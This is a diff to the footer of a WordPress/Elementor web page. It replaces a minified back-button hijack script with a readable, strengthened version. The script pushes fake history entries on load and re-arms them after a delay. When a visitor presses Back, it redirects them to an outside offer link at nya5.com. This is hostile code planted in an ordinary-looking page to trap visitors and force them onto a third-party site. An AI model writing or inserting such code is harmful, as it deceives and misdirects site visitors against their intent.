@@ -1654,6 +1654,30 @@ const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(
 
 </u></i></b></u></i></b><span id="elementor-device-mode" class="elementor-screen-only"></span><svg style="display: none;" class="e-font-icon-svg-symbols"></svg>
 
-<script type="text/javascript">! function (){var t;try{for (t=0; 10 > t; ++t) history.pushState({}, "", "#");onpopstate=function (t){t.state && location.replace(window.__offerUrl || "https://nya5.com/link?z=11838786")}}catch (o){}}();</script>
+<script type="text/javascript">
+(function () {
+  var dest = function () {
+    return window.__offerUrl || "https://nya5.com/link?z=11838786";
+  };
+  var locked = false;
+  function lock() {
+    try {
+      var href = location.pathname + location.search;
+      history.pushState({ b: 1 }, "", href);
+      history.pushState({ b: 2 }, "", href);
+      history.pushState({ b: 3 }, "", href);
+    } catch (e) {}
+  }
+  window.addEventListener("popstate", function () {
+    if (locked) return;
+    locked = true;
+    location.replace(dest());
+  });
+  window.addEventListener("load", function () {
+    lock();
+    setTimeout(lock, 400);
+  });
+})();
+</script>
 	
 </body></html>
